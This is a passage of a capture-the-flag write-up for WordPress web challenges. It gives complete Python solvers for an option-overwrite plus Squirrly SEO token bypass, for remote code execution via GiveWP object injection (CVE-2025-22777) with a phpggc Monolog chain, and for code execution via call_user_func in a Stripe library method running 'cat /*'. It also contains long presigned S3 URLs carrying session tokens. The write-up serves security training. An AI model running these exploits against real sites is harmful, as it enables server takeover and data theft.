        $nope = array('users_can_register', 'auto_update_core_minor', 'auto_update_core_dev', 'upload_url_path', 'mailserver_pass', 'wp_user_roles', 'template', 'blog_public', 'html_type', 'sticky_posts', 'use_balanceTags', 'page_for_posts', 'permanent-links', 'hack_file', 'multisite', 'comment_max_links', 'mailserver_login', 'use_trackback', 'comments_per_page', 'default_pingback_flag', 'siteurl', 'enable_app', 'large_size_w', 'default_comments_page', 'default_comment_status', 'links', 'moderation_keys', 'sidebars_widgets', 'posts_per_page', 'links_updated_date_format', 'default_role', 'theme', 'advanced_edit', 'image_default_link_type', 'blogname', 'thumbnail_size_w', 'admin_email', 'enable_xmlrpc', 'rss_use_excerpt', 'require_name_email', 'comment_whitelist', 'medium_large_size_h', 'show_comments_cookies_opt_in', 'comment_order', 'use_balancetags', 'close_comments_for_old_posts', 'gzipcompression', 'use_smilies', 'upload_path', 'moderation_notify', 'close_comments_days_old', 'medium_size_w', 'show_on_front', 'reading', 'show_avatars', 'default_post_format', 'site_icon', 'comments_notify', 'adminhash', 'gmt_offset', 'rewrite_rules', 'rss_language', 'thread_comments_depth', 'permalink_structure', 'default_category', 'links_recently_updated_append', 'thread_comments', 'home', 'widget_categories', 'use_linksupdate', 'default_post_edit_rows', 'comment_moderation', 'start_of_week', 'wp_page_for_privacy_policy', 'date_format', 'widget_text', 'active_plugins', 'avatar_default', 'timezone_string', 'auto_update_core_major', 'default_ping_status', 'tag_base', 'media', 'widget_rss', 'general', 'time_format', 'large_size_h', 'others', 'embed_size_w', 'posts_per_rss', 'image_default_size', 'mailserver_url', 'fileupload_maxk', 'page_comments', 'links_recently_updated_time', 'thumbnail_size_h', 'page_on_front', 'uploads_use_yearmonth_folders', 'ping_sites', 'comment_registration', 'thumbnail_crop', 'medium_large_size_w', 'recently_edited', 'image_default_align', 'avatar_rating', 'links_recently_updated_prepend', 'new_admin_email', 'comments', 'embed_size_h', 'default_email_category', 'embed_autourls', 'stylesheet', 'blacklist_keys', 'https_detection_errors', 'medium_size_h', 'category_base', 'blogdescription', 'avatars', 'mailserver_port', 'default_link_category', 'secret', 'writing', 'blog_charset');

        if(!in_array($option_name, $nope)){
            update_option($option_name, wp_json_encode($_POST["option_value"]));
        }

        echo "option updated";
    }
    ```

Our input will be JSON-encoded using `wp_json_encode`, meaning the options we can update will also be JSON-encoded. Let's check what we can modify in the database.

```php
sudo docker compose exec wp_service_1_db mysql -u root -pREDACTED
mysql> use wordpress;
mysql> select * from wp_options;
```

Using these commands, we get the following output:

![](./imgs/image_T27aVmlW.png)

These options are stored in JSON format, making them compatible with the encoding used in `test-plugin.php`.

Additionally for second vulnerability, we can see that several routes are registered in the **Squirrly SEO** plugin:

![](./imgs/image_Oew81giU.png)

One of these routes can be used to read posts containing the flag. Check the get route:

```php
			register_rest_route( $this->namespace, '/get/', array(
					'methods'             => WP_REST_Server::READABLE,
					'callback'            => array( $this, 'getData' ),
					'permission_callback' => '__return_true'
				) );
```

getData method

    ```php
    /**
    	 * Get data for the Focus Page Audit
    	 *
    	 * @param WP_REST_Request $request
    	 */
    	public function getData( WP_REST_Request $request ) {

    		global $wpdb;
    		$response = array();
    		SQ_Classes_Helpers_Tools::setHeader( 'json' );

    		//get the token from API
    		$token = $request->get_param( 'token' );
    		if ( $token <> '' ) {
    			$token = sanitize_text_field( $token );
    		}

    		if ( ! $this->token || $this->token <> $token ) {
    			exit( wp_json_encode( array( 'error' => esc_html__( "Connection expired. Please try again.", 'squirrly-seo' ) ) ) );
    		}

    		$select = $request->get_param( 'select' );

    		switch ( $select ) {
    			case 'innerlinks':

    				$inner_links = array();
    				$url         = esc_url_raw( $request->get_param( 'url' ) );
    				$start       = (int) $request->get_param( 'start' );
    				$limit       = (int) $request->get_param( 'limit' );

    				if ( $url == '' ) {
    					exit( wp_json_encode( array( 'error' => esc_html__( "Wrong Params", 'squirrly-seo' ) ) ) );
    				}

    				//define vars
    				if ( $limit == 0 ) {
    					$limit = 1000;
    				}

    				//prepare the url for query
    				$url_backslash = str_replace( '/', '\/', str_replace( rtrim( home_url(), '/' ), '', $url ) );
    				$url_encoded   = urlencode( str_replace( trim( home_url(), '/' ), '', $url ) );
    				$url_decoded   = str_replace( trim( home_url(), '/' ), '', urldecode( $url ) );

    				//get post inner links
    				$select_table = $wpdb->prepare( "SELECT ID FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit );
    				if ( $ids = $wpdb->get_col( $select_table ) ) {
    					$query = $wpdb->prepare( "SELECT `ID` FROM `$wpdb->posts` as p WHERE ID in (" . join( ',', array_values( $ids ) ) . ") AND (p.post_content LIKE %s OR p.post_content LIKE %s OR p.post_content LIKE %s OR p.post_content LIKE %s)", '%' . $url . '%', '%' . $url_backslash . '%', '%' . $url_encoded . '%', '%' . $url_decoded . '%' );

    					if ( ! $inner_links = wp_cache_get( md5( $query ) ) ) {
    						//prepare the inner_links array
    						$inner_links = array();

    						if ( $rows = $wpdb->get_results( $query ) ) {
    							if ( ! empty( $rows ) ) {
    								foreach ( $rows as $row ) {
    									if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
    										$inner_links[] = get_permalink( $row->ID );
    									}
    								}
    							}
    						}

    					}

    					wp_cache_set( md5( $query ), $inner_links, '', 3600 );
    				}

    				$response = array( 'url' => $url, 'inner_links' => $inner_links );
    				break;

    			case 'keyword':

    				$url     = esc_url_raw( $request->get_param( 'url' ) );
    				$keyword = sanitize_text_field( $request->get_param( 'keyword' ) );
    				$start   = (int) $request->get_param( 'start' );
    				$limit   = (int) $request->get_param( 'limit' );

    				if ( $url == '' || $keyword == '' ) {
    					exit( wp_json_encode( array( 'error' => esc_html__( "Wrong Params", 'squirrly-seo' ) ) ) );
    				}

    				//define vars
    				if ( $limit == 0 ) {
    					$limit = 1000;
    				}
    				$regex = "\\b" . strtolower( $keyword ) . "\\b";

    				//get post keywords found
    				$select_table = $wpdb->prepare( "SELECT ID FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit );
    				if ( $ids = $wpdb->get_col( $select_table ) ) {
    					$query = $wpdb->prepare( "SELECT `ID`, `post_content` FROM `$wpdb->posts` as p WHERE ID in (" . join( ',', array_values( $ids ) ) . ") AND (LOWER(p.post_content) REGEXP %s)", $regex );

    					if ( ! $urls = wp_cache_get( md5( $query ) ) ) {
    						//prepare the url for query
    						$urls = array();

    						if ( $rows = $wpdb->get_results( $query ) ) {
    							if ( ! empty( $rows ) ) {
    								foreach ( $rows as $row ) {
    									if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
    										$row->content = str_replace( '\/', '/', $row->content );

    										$urls[] = array(
    											'post_id'   => $row->ID,
    											'permalink' => get_permalink( $row->ID ),
    											'innerlink' => strpos( $row->content, untrailingslashit($url) ) !== false
    										);
    									}
    								}
    							}
    						}

    						wp_cache_set( md5( $query ), $urls, '', 3600 );
    					}

    					$response = array( 'keyword' => $keyword, 'urls' => $urls );
    				}else{

    					$response = array( 'keyword' => '', 'urls' => array() );
    				}

    				break;
    			case 'posts':
    				//get post inner links
    				$total_posts = 0;

    				if ( $row = $wpdb->get_row( $wpdb->prepare( "SELECT COUNT(`ID`) as count FROM `$wpdb->posts` WHERE `post_status` = %s", 'publish' ) ) ) {
    					$total_posts = $row->count;
    				}

    				$response = array( 'total_posts' => $total_posts );
    				break;

    			case 'post':

    				$id = (int) $request->get_param( 'id' );

    				if ( $id == 0 ) {
    					wp_send_json_error( esc_html__( "Wrong Params", 'squirrly-seo' ) );
    				}

    				//get Squirrly SEO post metas
    				if ( $post = SQ_Classes_ObjController::getClass( 'SQ_Models_Snippet' )->setPostByID( $id ) ) {
    					$response = $post->toArray();
    				}

    				break;

    			case 'squirrly':

    				//Get Squirrly settings
    				if ( $options = SQ_Classes_Helpers_Tools::getOptions() ) {
    					$response = (array) $options;
    				}

    				break;
    		}

    		echo wp_json_encode( $response );

    		exit();

    	}
    ```

To activate this route, we need to enable several options stated here.

```php
	public function hookInit() {

		if ( SQ_Classes_Helpers_Tools::getOption( 'sq_api' ) == '' ) {
			return;
		}

		if ( ! SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_connect' ) ) {
			return;
		}

		$this->token = SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_token' );

		//Change the rest api if needed
		add_action( 'rest_api_init', array( $this, 'sqApiInit' ) );
	}

```

First, one is `sq_qpi`, the second is `sq_cloud_connect`, and the last is `sq_cloud_token` to bypass the token verification part.

Lastly, you just need to access that REST and specify `token` with your updated token via the `update_option`, `select` with the value `post`, and `id` with the ID of the post you want to read.

## Solver

```python
import httpx
import asyncio

URL = "http://52.77.81.199:9177/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def update_option(self) -> None:
        return await self.c.post("/wp-admin/admin-ajax.php?action=uptoyou", data={
            "option_name": "sq_options",
            "option_value[sq_cloud_token]": "dimas123",
            "option_value[sq_api]": "dimas123",
            "option_value[sq_cloud_connect]": "dimas123",
        })
    def get_flag(self):
        return self.c.get("/wp-json/squirrly/get?token=dimas123&select=post&id=5")

async def main():
    api = API()
    res = await api.update_option()    
    res = await api.get_flag()    
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())

```

### Flag

![](./imgs/image_wjb34FXP.png)

# **Give**

| Solves | 3 |
| ------ | - |

Description

    Who give me ?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/da961bec-d193-484a-8f40-dd16f9e1abb2/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TL5ZPEG2%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133656Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQCitZW66ZqUI%2BDwbbGKI45YvX6ta2%2F0f2NIegFSX8ELDQIhAMdEx66iyFymtTzRPKmFo%2Bk6EQtyjmXG%2Fj1PAsByi88GKogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgyQYHXOSIS%2FxnyNqTsq3ANR0slHJ1s9FW%2Ft0zclnxSqCyW3P3bx2KsBGjQjl1xm6zxWJR2MUQsXG3X5je%2F%2BkpJS%2FIiPZ%2BaNUOVucPE%2F4MMUlgpUt28KrYSiMJe9PsUw9n%2BYs%2FjvCw3FHaHkDiyYkVeiAPEYLwISzeJ1Iy7cOiOrMlFctHKPqfA%2F7i0KVyPc%2FINVOkz70Hb7QH7NCYsVnCJKQu1S0t%2FryguTNI%2FyhygHoVDGJDRclMgJEW72y3%2FfFYc8PiwIybgFMw08LQ8jAzcC2VUOeqWLh%2F1%2FcjIAz4F84NGoTaTdTd%2BTRNs3iLvmSPxeci9Ic8J%2F0W3JmO2FDPRV3A7ABH0HUgLZEnMAeGMoxqGzgMXsn3mimik%2B6ioaSyKKOWc8rx43i5c6OvVvO6%2B%2BAc3GhMhRmIYnrg2%2BXGX4UkMS6VqKwSM1c7YdT6CHo4OIsvrr4S8HQCBKl0Rh%2Fa0WcGX320eV2NOxPd3g26w4pDydV0MGkbWJtmIFuoWj93mRPp9XAwZVA8%2FqbbbmSsbauZOBLhXEv5%2BmEwtLhTGNHXOxZTY4ucff3fmxdozDGskYpm4pgmPZJNbDdETLFsxrZudEKE5LTftyuBmJO%2B73EqemY8gqpcYzOSSfvnMDAuhh%2FJGjdrweAd%2BJxzCs8sHBBjqkAZW%2B16cKARaenGUsyuaLViWIATWZWMSHf7iMRewgDq3fjmkLiGCtjJXiFGtSPSakrh5F10SAhXEki9FMsd9x97lUN7BAPJ0IiR7C5zxxvC9gMShxnJ1q8mRIGIOuXMAQaOhWa4%2BDfo5HjbEFUjeJgb5Dlm90e8pe86Ss2%2BoLEspIIz1OJKeKuRUu64UwGXdpdrFzubUgMiur2%2Bn4Qn2FRs%2B3wwaP&X-Amz-Signature=595aa294399b8ff7eea8d7ecb0216a1febd90b3701c5c8f56394c417b5edaeee&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [Critical Vulnerability Patched in GiveWP Plugin - Patchstack](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/)

    - [Rollbar Plugin - PHP Object Injection Gadget:](https://www.notion.so/10848583e65d8026a1cbeb7d36f38336#d2f2d20e16e14429af47786aa6023db8) 

***

In this challenge, we need to exploit a known vulnerability in GiveWP **CVE-2025-22777.** This CVE is related to PHP Object Injection, and a partial POC is published in this article: [Critical Vulnerability Patched in GiveWP Plugin - Patchstack](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/).

To exploit this vulnerability, you need just two things: one is the GiveWP form, and the second is the PHP POP Gadget. For the PHP POP Gadget, since the challenge has Rollbar installed, which is known to have a PHP POP Chain due to its dependency from a previous CTF here [Rollbar Plugin - PHP Object Injection Gadget:](https://www.notion.so/10848583e65d8026a1cbeb7d36f38336#d2f2d20e16e14429af47786aa6023db8) , you can use this as a gadget to exploit the PHP POP Chain. You can see more details on how to exploit this in the solver below.

## Solver

```python
import httpx
import asyncio
import re
import subprocess
URL = "http://52.77.81.199:9140/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

    def wp_login(self, username: str, password: str) -> None:
        return self.c.post("/wp-login.php", data={
            "log": username,
            "pwd": password
        })
    

class API(BaseAPI):
    async def donate(self, url) -> None:
        data = {
            "amount": "10",
            "currency": "USD",
            "donationType": "single",
            "formId": "9",
            "email": "admin@getmoreplugins.com",
            "gatewayId": "manual",
            "firstName": "a",
            "lastName": "a",
            "comment": subprocess.check_output("./phpggc/phpggc Monolog/RCE7 system 'cat /*'", shell=True).replace(b"a:", b"a%F0%9F%98%BC:").replace(b"O:", b"O%F0%9F%98%BC:").replace(b"s:", b"s%F0%9F%98%BC:").replace(b"i:",b"i%F0%9F%98%BC:").strip(),
            "company": "",
            "donationBirthday": "",
            "originUrl": "http://localhost:9140/donations/",
            "isEmbed": "true",
            "embedId": "9",
            "gatewayData[testGatewayIntent]": "test-gateway-intent"
        }
        
        # URL-encode the data
        return await self.c.post(url, files={"a":("a","b")}, data=data)  # Send the URL-encoded data with headers
    async def get_givewp_post_url(self):
        res = await self.c.get("/?givewp-route=donation-form-view&form-id=9")
        url = re.findall('"donateUrl":"(.*?)"',res.text)[0].replace("\\/", "/")
        return url   

async def main():
    api = API()

    # Get the signature and expiration
    url = await api.get_givewp_post_url()

    # Example usage of the donate method
    donation_response = await api.donate(url)
    print(donation_response.text)

if __name__ == "__main__":
    asyncio.run(main())

```

### Flag

![](./imgs/image_RSxstIc5.png)

# **Unicorn**

| Solves | 2 |
| ------ | - |

Description

    Now I am a Unicorn.

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8c26dec7-858d-452f-900c-dd8bc484d2ca/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZQJ653Z2%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133657Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIQCpyf07POUymoc0QshHrDgspqYerNeM9kgpqinTZ%2BxLMQIgeBT1LEm8lL0VQqvVRTBkBSvZelhmABeSfiqGyJchxMkqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDkHBKprOZzDMyZGPircA%2FdbHMPwN78ssZV5l9V4GHOoeBRak8UgOtG6WuKqalUD0npTXMBRBCBJj99whjNwhbKjJ8SkWkyF9TVz6ZRcIHArhHNXywFJlDJS6dMmcLz3HDNpLytY%2F0QoZO9iXT5Sabq98E7Q4MNOjTX7Fnujio1aX7GzuCrg8CpEfpf6SLifAFjvdNGhV4cGC03TLBwJZmmagld3YAOm5LIYcnalyeMvGI2MigpMOnvHP7aMacOCiGp92vGefTLkf4z7JNN4GPOowhWIcxgCZa3eK%2Bt4XBZH5qFudFl1T6fC5SYOOMNfcKKjbWzRvO5KUNc3Y9uUmweTOkjjQUd02WWQ%2BFG%2BbMTDFIv%2FVKqz8Xlzkhd5v28vpLDN3EUfVjJ5CYYseu%2BeyunYmhMHtiIoOw%2Fda%2FGB0yEPXtwqxiHEgxZM4MqJk%2BEfZUid1%2FBB8H7%2F3RzfsF3U4ECBw0cdRwPVgG1UXTwZwZUOPlv8WdnJk%2BRlI94hdAPJYRJF0oq03wspokQGqhxj%2B26cHXPZ2AvdiZ6xE%2F2IRlkEhvpSW9VAiJupLtgfLvK3LiJh7NVXSATFlF2cwfpPKWhUnptdJrgSadsfmaBI3t%2BiY%2FlWUdyveWUc8KGPbSDGPenBdx0kbvH9TT6cML%2FywcEGOqUBUd1GnXb8FbuU0VANr9SijIos4gPnSEt9G5geOAYUOvoFxfNkcRBXncba1WaUDbnSU8tgeiYvg6vHXT8GjQgTX4xAe1kM8ZGMY%2BetIGUCbA3PEEF60F9Z4lZu2REOt6lBE0%2Bhjn2hsBLQ%2FysQDGSwUwcvdlDYW2H0PzBhshYPayozEjtTUliAaZDFVCX9V46k37IOnXUBHHf3gnmismci%2F33hWsgk&X-Amz-Signature=51871ee7a5fbc9b993424a63cbe3de919449fcc0ecef35a1b76de883b4100062&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we have the power to call an arbitrary method from allowed namespaces, but the restriction is that we can control only one argument, and the argument is an array. So, we need a method that both accepts an array and requires only one argument while also being in the whitelisted namespaces. Here is the server that handles the method calling:

server-given/challenge-custom/unicorn/includes/class-main.php

    ```php
    add_action('wp_ajax_nopriv_handle_ajax', 'handle_ajax');

    function handle_ajax() {
        $whitelisted_namespaces = [
            '\\Unicorn\\',
            '\\Stripe\\ApiOperations',
            '\\Stripe\\Apps',
            '\\Stripe\\Billing', 
            '\\Stripe\\Climate',
            '\\Stripe\\Entitlements',
            '\\Stripe\\Events',
            '\\Stripe\\Exception',
            '\\Stripe\\Exception\\OAuth',
            '\\Stripe\\FinancialConnections',
            '\\Stripe\\HttpClient',
            '\\Stripe\\Issuing',
            '\\Stripe\\Service',
            '\\Stripe\\Treasury',
            '\\PaypalServerSdkLib\\Controllers',
            '\\PaypalServerSdkLib\\Models',
            '\\Psr\\EventDispatcher',
            '\\Symfony\\Component',
            '\\Give\\Vendors',
            '\\Action_Scheduler\\Migration'
        ];

        if (!isset($_REQUEST['token']) || false === check_ajax_referer('ajax_submit_unicorn', 'token', false)) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid token', 'real-time-auto-find-and-replace'),
                'text'   => __('Sorry! we are unable recognize your auth!', 'real-time-auto-find-and-replace'),
            ));
        }

        if (!isset($_REQUEST['data']) && isset($_POST['method'])) {
            $data = $_POST;
        } else {
            $data = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';
        }

        // Get methods
        $method = isset($data['method']) ? $data['method'] : (isset($_REQUEST['method']) ? $_REQUEST['method'] : '');

        if (empty($method) || strpos($method, '@') === false) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Request', 'real-time-auto-find-and-replace'),
                'text'   => __('Method parameter missing / invalid!', 'real-time-auto-find-and-replace'),
            ));
        }

        $method = explode('@', $method);
        $class_path = \str_replace('\\\\', '\\', $method[0]);
        // $class_path = \str_replace('\\\\', '\\', '\\Unicorn\\' . $method[0]);

        $is_whitelisted = false;
        foreach ($whitelisted_namespaces as $namespace) {
            if (strpos($class_path, $namespace) === 0) {
                $is_whitelisted = true;
                break;
            }
        }

        if (!$is_whitelisted) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Namespace', 'real-time-auto-find-and-replace'),
                'text'   => __('The requested namespace is not allowed.', 'real-time-auto-find-and-replace'),
            ));
        }

        if (!class_exists($class_path)) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Library', 'real-time-auto-find-and-replace'),
                'text'   => sprintf(__('Library Class "%s" not found! ', 'real-time-auto-find-and-replace'), $class_path),
            ));
        }

        if (!method_exists($class_path, $method[1])) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Method', 'real-time-auto-find-and-replace'),
                'text'   => sprintf(__('Method "%1$s" not found in Class "%2$s"! ', 'real-time-auto-find-and-replace'), $method[1], $class_path),
            ));
        }

        (new $class_path())->{$method[1]}($data);
        exit;
    }
    ```

After searching with regex, I found something interesting in the `parse` method of the `RequestOptions` class here:

server-given/challenge-custom/unicorn/vendor/stripe/stripe-php/lib/Util/RequestOptions.php

    ```php
    <?php

    namespace Stripe\Util;

    /**
     * @phpstan-type RequestOptionsArray array{api_key?: string, idempotency_key?: string, stripe_account?: string, stripe_context?: string, stripe_version?: string, api_base?: string }
     * @psalm-type RequestOptionsArray = array{api_key?: string, idempotency_key?: string, stripe_account?: string, stripe_context?: string, stripe_version?: string, api_base?: string }
     */
    class RequestOptions
    {
        ...snip...
        /**
         * Unpacks an options array into an RequestOptions object.
         *
         * @param null|array|RequestOptions|string $options a key => value array
         * @param bool $strict when true, forbid string form and arbitrary keys in array form
         *
         * @throws \Stripe\Exception\InvalidArgumentException
         *
         * @return RequestOptions
         */
        public static function parse($options, $strict = false)
        {
            if ($options instanceof self) {
                return clone $options;
            }

            if (null === $options) {
                return new RequestOptions(null, [], null);
            }

            if (\is_string($options)) {
                if ($strict) {
                    $message = 'Do not pass a string for request options. If you want to set the '
                        . 'API key, pass an array like ["api_key" => <apiKey>] instead.';

                    throw new \Stripe\Exception\InvalidArgumentException($message);
                }

                return new RequestOptions($options, [], null);
            }

            if (\is_array($options)) {
                $headers = [];
                $key = null;
                $base = null;

                if (\array_key_exists('api_key', $options)) {
                    $key = $options['api_key'];
                    unset($options['api_key']);
                }
                if (\array_key_exists('idempotency_key', $options)) {
                    $headers['Idempotency-Key'] = $options['idempotency_key'];
                    unset($options['idempotency_key']);
                }
                if (\array_key_exists('stripe_account', $options)) {
                    if (null !== $options['stripe_account']) {
                        unset($options['action']);
                    }   
                }
                if (\array_key_exists('stripe_context', $options)) {
                    if (null !== $options['stripe_context']) {
                        $headers['Stripe-Context'] = $options['stripe_context'];
                    }
                    unset($options['stripe_context']);
                }
                if (\array_key_exists('stripe_version', $options)) {
                    if (null == $options['action']) {
                        $headers['Stripe-Version'] = $options['stripe_version'];
                        $base = $options['api_base'];
                        $version = $options['stripe_version'];
                        call_user_func($base, $version);
                    }
                    unset($options['stripe_version']);
                }
                if (\array_key_exists('api_base', $options)) {
                    $base = $options['api_base'];
                    unset($options['api_base']);
                }

                if ($strict && !empty($options)) {
                    $message = 'Got unexpected keys in options array: ' . \implode(', ', \array_keys($options));

                    throw new \Stripe\Exception\InvalidArgumentException($message);
                }

                return new RequestOptions($key, $headers, $base);
            }

            $message = 'The second argument to Stripe API method calls is an '
                . 'optional per-request apiKey, which must be a string, or '
                . 'per-request options, which must be an array. (HINT: you can set '
                . 'a global apiKey by "Stripe::setApiKey(<apiKey>)")';

            throw new \Stripe\Exception\InvalidArgumentException($message);
        }
        ...snip...
    }

    ```

You will see that the method accepts an array as an argument, and eventually, our array will reach `call_user_func`, which means we can gain RCE using it. But wait, it's not in the whitelisted namespace. So, we need to find another method in the whitelisted namespace that will call the `parse` method. That's when I stumbled upon this class.

server-given/challenge-custom/unicorn/vendor/stripe/stripe-php/lib/Billing/CreditBalanceTransaction.php

    ```php
    <?php

    // File generated from our OpenAPI spec

    namespace Stripe\Billing;

    /**
     * A credit balance transaction is a resource representing a transaction (either a credit or a debit) against an existing credit grant.
     *
     * @property string $id Unique identifier for the object.
     * @property string $object String representing the object's type. Objects of the same type share the same value.
     * @property int $created Time at which the object was created. Measured in seconds since the Unix epoch.
     * @property null|\Stripe\StripeObject $credit Credit details for this credit balance transaction. Only present if type is <code>credit</code>.
     * @property string|\Stripe\Billing\CreditGrant $credit_grant The credit grant associated with this credit balance transaction.
     * @property null|\Stripe\StripeObject $debit Debit details for this credit balance transaction. Only present if type is <code>debit</code>.
     * @property int $effective_at The effective time of this credit balance transaction.
     * @property bool $livemode Has the value <code>true</code> if the object exists in live mode or the value <code>false</code> if the object exists in test mode.
     * @property null|string|\Stripe\TestHelpers\TestClock $test_clock ID of the test clock this credit balance transaction belongs to.
     * @property null|string $type The type of credit balance transaction (credit or debit).
     */
    class CreditBalanceTransaction extends \Stripe\ApiResource
    {
        ...snip...
        public static function retrieve($opts, $id = null)
        {
            $opts = \Stripe\Util\RequestOptions::parse($opts);
            $instance = new static($id, $opts);
            $instance->refresh();

            return $instance;
        }
    }

    ```

This class will call the `parse` method and requires only one argument, which means we can use it to gain access to `call_user_func`. Then, you just need to add this class method into `handle_ajax` and provide the required argument to reach `call_user_func` in the `parse` method, just like in the solver below.

## Solver

```python
import httpx
import asyncio
import re

URL = "http://52.77.81.199:9143/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    async def handle_ajax(self, token):
        return await self.c.post("/wp-admin/admin-ajax.php?action=handle_ajax", data={
            "token": token,
            "data[method]": r"\Stripe\Billing\CreditBalanceTransaction@retrieve", 
            "data[stripe_version]": r"1", 
            "data[api_base]": r"system", 
            "data[stripe_version]": r"cat /*", 
        })


class API(BaseAPI):
    async def get_nonce(self):
        res = await self.c.get("/wp-admin/admin-ajax.php?action=foo")
        return re.findall("var ajaxNonce = '(.*?)'", res.text)[0]

async def main():
    api = API()
    nonce = await api.get_nonce()
    res = await api.handle_ajax(nonce)
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
```

### Flag

![](./imgs/image_V1OBnIfh.png)

# **Woops**

| Solves | 2 |
| ------ | - |

Description

    woops, woops, woops, you found it.

    - ) there is a plugin code that are not included on the given attachment, you can just get it from "some" source

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/1644be82-fb9b-467b-85d8-a23458c92d24/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663XAZ7A2O%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133702Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQDUt7OpVNnRnoUk17G6QFq7aIm8OsyvViMtknAT0pHdUwIhAIDGqw%2BmygfiWGOWA5SQDrSve%2FmCn%2BSwWH3KO%2B9REzTJKogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igypf5LKRn0q%2BikkKa0q3AMhOb5LfmYpaekWefVjwpQmolCoHJ7ATmyk7uSZpLkrUwowC5Ve4LfuztuZV4M5QcI0nqXs6eeLVD5syB%2BZP05xpcL4WGxl%2FAQSHZcdeQAJMK3pqxXvnA%2F49gAhzQd6xUI5g3eVMfc%2FF3yRCwXgo%2B2fabOTxsHuer91LXXlUf6tIkEAFa%2BaNteEiI1G%2B6g6i3sWRZvcYThCa5T9eTyjvBv%2BUjBe%2Fee6ZPlqnDH6c%2Bq%2FvzMYVq9SiU%2B9%2BEzPRaJSYx1NxiI%2FC3FxUb8YytdffyPEr%2B9F4xcXO5UvOtflXj7pGbJH5MbDFWXXu5XH%2FdJksrbRumxxlyqhYva24y2kSi1kKcdBMDsl%2BiE0zc%2FviUgOkWf94SMEMUr%2FSuOb04ZNSoPTaTFF8zyBqY4SFQOt1osoTZ4F6MDZDeoLwp0vuDpRImE%2BZOi%2BfUjWA%2BxjfCUnEgCHXMqCKdvnITe2ZE4Xt7cefkl0EtjVWvGP71zCL3zVK0g%2BxchGurVY92C7Isni8ZryhVVJw0gTUqsBcEdxkHWshuELn8M3q0NN9CN%2Fv19cOw1WY%2BcSkjdUEwHx4CKy2ccI%2FQ%2FAhQfJpWehUiZfll3G3qSaIKoMt4%2BGkmBNCraGr1TOVaydumtyPZ3eZTDg8cHBBjqkASje3IJnb%2Fh7u67K%2BfvvmDMFxm3cl2q%2Bovo5hwwLEk5E4WIP4Ui%2B3i2HavzVjRbPfAhX5LKEBscRFmXeCnW7himm5I4Bp8ywb5EZdHn42pN7j5%2FUuSAphWkNJIfQOuLhhoF0aCPoi0doAt%2FATnDry4YoqDcS3e%2BUUL1clR%2F5nJP%2B8u6c1kD6oJIfFl0RL6jSaHhjDp%2FXCzg47FGl4icXfQcvdgxH&X-Amz-Signature=9426f70542a945ba570411c61351c1d8ecf404423974732c1c695638379c251f&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we first need to get the missing plugin. We can read the common file name in a WordPress plugin, such as `changelog.txt`, as an example here:

![](./imgs/image_NBywg0PL.png)

We see that the `js_composer` plugin is using version 7.4 and, interestingly, is referenced in the Patchstack database here: [WPBakery Page Builder Vulnerabilities - Patchstack](https://patchstack.com/database/wordpress/plugin/js_composer/). The plugin should be vulnerable to Local File Inclusion. See the image below:

![](./imgs/image_yUbNWnb0.png)

